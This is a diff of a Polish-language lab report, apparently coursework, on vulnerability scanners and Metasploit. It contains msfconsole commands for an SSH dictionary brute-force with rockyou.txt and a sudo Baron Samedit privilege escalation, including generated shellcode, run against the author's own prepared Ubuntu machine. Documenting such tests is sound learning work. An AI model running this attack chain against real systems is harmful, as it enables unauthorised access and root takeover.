@@ -12,18 +12,18 @@ Skanery podatności oprogramowania to zautomatyzowanie narzędzia które skanuj�
 ** Licencjowanie
   Zwykle jest to oprogramowanie wspomagane poprzez społeczeństwo używające licencji otwartego oprogramowania (apache, MIT) lub /copyleftowych/ licencji wolnego oprogramowania (GPL,BSD 3 clause) albo sa wspierane jako produkt przez firme oferujące usługi zawarte w takim skanerze. Część tych produktów ma również darmową wersję (czasami rozwijane jako /community/ używając powyższych licencji).
 ** Funkcjonalność
-Skanery te można podzielić na takie które
+Skanery te można podzielić na takie które mają zbiór testów które przeprowadzają i takie w których użytkownik uzyskając informacji z innych źrodeł (np. enumeracji) wybiera te narzędzia które chce wykorzystać (przydatne przy ograniczaniu widoczności/wykrywalności przy pen testowaniu lub bardziej kryminalnych formach)
 * Metasploit Framework
-Metasploit jest jednym z bardziej zaawansowanych (i rozległych) narzędzi do pentestowania.
+Metasploit jest jednym z bardziej zaawansowanych (i rozległych) narzędzi do pentestowania. Jest to jak w nazwie jest wymienione narzędzie typu framework, które raczej niż być typowym skanerem, jest zbiorem narzędzi do automatyzacji pentestingu. Pozwala on na dosyć skomplikowane skryptowanie oraz łatwość łączenia pojedynczych penetracji poprzez /privilage escalation/ (podniesienie uprawnien) aż do montowania modułów pozwalających na zagnieżdżenie sie w danym systemie.
 
 
 
-Niestety z braku projektów
+
 
 ** Instalacja
-Moja dystrybucja systemu GNU/linux (ArchLinux) oferuje paczkę Metasploit w repozytorium. Metasploit wymaga tylko konfiguracji rvm (ruby) oraz załozenia bazy danych postgres.
+Moja dystrybucja systemu GNU/linux (ArchLinux) oferuje paczkę Metasploit w repozytorium. Metasploit wymaga (zależenie od dystrybucji)  konfiguracji rvm (ruby) oraz załozenia bazy danych postgres. Bardzo dobrym zasobem który ułatwi instalacje jest [[https://wiki.archlinux.org/title/Metasploit_Framework][archwiki.org]]
 ** Bruteforce ssh
-W tym przypadku spreparowalem konto na systemie który bedzie celem penetracji.
+W związku z brakami w projektach na których dobrze możnaby było pokazać moc takiego narzędzia, zostało spreparowane konto na systemie niezaktualizowanym komputerze który bedzie celem penetracji.
 #+begin_src 
 
   #useradd msfexploit
@@ -31,7 +31,11 @@ W tym przypadku spreparowalem konto na systemie który bedzie celem penetracji.
 
 #+end_src
 
-Na maszyne z metasploit pobrałem również popularny plik słownikowy rockyou.txt zawierający najczęsciej pojawiające się hasła.
+Na maszyne z metasploit pobrałem również popularny plik słownikowy rockyou.txt zawierający najbardziej popularne hasła (140MB haseł) zawierający najczęsciej pojawiające się hasła.
+Zwykle atak słownikowy prowadziłoby się na pliku bazy danych z hashami haseł i salt, uzyskany w innym ataku (lokalnie), jest możliwe jednak przeprowadzenia ataku bruteforce na /żywym/ celu jednak jest to bardzo łatwe do wykrycia.
+
+#+caption: Przykladowe listy słów z różnych wycieków bezpieczeństwa
+[[./wordlist.png]]
 
 #+begin_export latex
 {\scriptsize
@@ -71,7 +75,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) >
 }
 #+end_export
 
-Po paru minutach metasploit znalazł hasło i stworzył "sesje" którą mozna podać innym modułom które mogą posłużyć naprzyklad do podniesienia uprawnien.
+Po paru minutach metasploit znalazł hasło i stworzył /sesję/ którą mozna podać innym modułom które mogą posłużyć naprzyklad do podniesienia uprawnien.
 
 #+begin_src bash
 
@@ -94,14 +98,74 @@ msf6 auxiliary(scanner/ssh/ssh_login) >
 
 ** Sudoedit
 
-Następnie używając poprzednio utworzonej sesji metasploit wykona atak na stara wersje sudo na niezaktualizowanym systemie ubuntu 20.04
+Następnie używając poprzednio utworzonej sesji metasploit wykona atak na stara wersje sudo na niezaktualizowanym systemie ubuntu 20.04 aby uzyskać podniesienie uprawnień (ang. /privlage escalation/) do superusera. Tutaj moglibyśmy pomyśleć że informacje o statusie aktualizacji możemy zbadać za pomocą albo enumeracji systemu np. `sudo --version` jeżeli widzimy ze system nie był aktualizaowany od danego czasu. Wybierając exploit możemy wyszukać exploit w konsoli metasploit sortując po dacie znalezienia danego exploitu lub błędu.
 
 #+begin_src bash
 
-  msf6 exploit(linux/local/sudo_baron_samedit) > use payload/linux/x64/exec
-  msf6 payload(linux/x64/exec) > set cMD "touch /home/msfexploit/here.txt"
-  cMD => touch /home/msfexploit/here.txt
-  msf6 payload(linux/x64/exec) > use payload/linux/x64/exec
-  msf6 payload(linux/x64/exec) > use exploit/linux/local/sudo_baron_samedit
+    msf6 exploit(linux/local/sudo_baron_samedit) > use payload/linux/x64/exec
+    msf6 payload(linux/x64/exec) > set CMD "touch /root/here.txt" #konfigurujemy "payload", ładunek ktory zostanie wykonany po naszym ataku
+    CMD => touch /root/here.txt
+    msf6 payload(linux/x64/exec) > generate
+    # linux/x64/exec - 57 bytes
+    # https://metasploit.com/
+    # VERBOSE=false, PrependFork=false, PrependSetresuid=false,
+    # PrependSetreuid=false, PrependSetuid=false,
+    # PrependSetresgid=false, PrependSetregid=false,
+    # PrependSetgid=false, PrependChrootBreak=false,
+    # AppendExit=false, MeterpreterDebugLevel=0,
+    # RemoteMeterpreterDebugFile=, CMD=touch /root/here.txt,
+    # NullFreeVersion=false
+    buf =
+    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f" +
+    "\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x74" +
+    "\x6f\x75\x63\x68\x20\x2f\x72\x6f\x6f\x74\x2f\x68\x65\x72" +
+    "\x65\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f" +
+    "\x05"
 
 #+end_src
+Metasploit wygenerował shellcode który po wykonaniu exploitu sudoedit zostanie wstrzykniety.
+
+
+#+begin_src bash
+
+    msf6 payload(linux/x64/exec) > use exploit/linux/local/sudo_baron_samedit
+    msf6 exploit(linux/local/sudo_baron_samedit) > set payload linux/x64/exec
+    payload => linux/x64/exec
+    msf6 exploit(linux/local/sudo_baron_samedit) > sessions
+
+    Active sessions
+    ===============
+
+    Id  Name  Type         Information                          Connection
+    --  ----  ----         -----------                          ----------
+    1         shell linux  SSH msfexploit:password1 ([fdd3:f3e  [fdd3:f3e5:50a8::dd4]:38703 -> [fdd3
+                           5:50a8::23d]:22)                     :f3e5:50a8::23d]:22 (fdd3:f3e5:50a8:
+                                                                :23d)
+    msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 1
+#+end_src
+
+Metasploit używa konceptu sesji by utrzymywać połączenie z atakowanym hostem i jako interfejs pomiedzy exploitami
+
+#+begin_src bash
+
+msf6 exploit(linux/local/sudo_baron_samedit) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture:
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
+[*] Writing '/tmp/sTF7azr5C8.py' (7734 bytes) ...
+[*] Writing '/tmp/libnss_7A/9Utj.so.2' (439 bytes) ...
+[*] Exploit completed, but no session was created.
+
+#+end_src
+
+Następnie możemy sprawdzić czy atak nam sie udał na lokalnym hoscie
+
+#+begin_src bash
+root@servbuntu:~# ls
+here.txt  scull1  snap
+#+end_src
+
+* Podsumowanie
+Metasploit Framework jest narzędziem do głownie pentestingu i nie oferuje szybkich i łatwych analiz prostych błedów i skupia sie na przybliżeniu narzędzi pentestingu do użytkownika. Oferuje dużą baze exploitów i typowych błedów konfiguracji, jednak wymaga od użytkownika znajomości narzędzi oraz metod enumeracji część z których jest zawarta we wszeklich funkcjach autodetekcji a cześć w oddzielnym oprogramowaniu (np. gobuster, nmap) które zwykle jest zaopatrywanie przez metapackages albo zintegorwane w systemie np. Kali - dystrybucja GNU/linux która domyślnie zaopatrza dużą cześc narzędzi, słowników które mogą być przydatne w enumeracji oraz pentestingu.
